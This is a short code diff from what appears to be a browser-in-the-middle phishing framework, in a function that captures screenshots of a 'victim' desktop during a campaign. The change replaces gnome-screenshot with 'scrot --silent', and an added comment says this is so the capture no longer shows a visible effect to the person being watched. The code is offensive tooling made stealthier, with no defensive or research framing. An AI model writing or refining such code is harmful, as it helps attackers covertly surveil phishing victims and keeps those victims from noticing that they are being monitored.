@@ -171,8 +171,10 @@ def capture_victim_screenshot(campaign, victim_id: str) -> CapturedScreenshot:
     temporary_path = f"/tmp/pbitm-screenshot-{secrets.token_hex(12)}.png"
 
     try:
+        # gnome-screenshot displays a visible capture effect in the streamed
+        # desktop. scrot reads the X11 root window directly and stays silent.
         result = container.exec_run(
-            ["gnome-screenshot", "-f", temporary_path],
+            ["scrot", "--overwrite", "--silent", temporary_path],
             user=desktop_user,
             environment={"DISPLAY": display},
         )
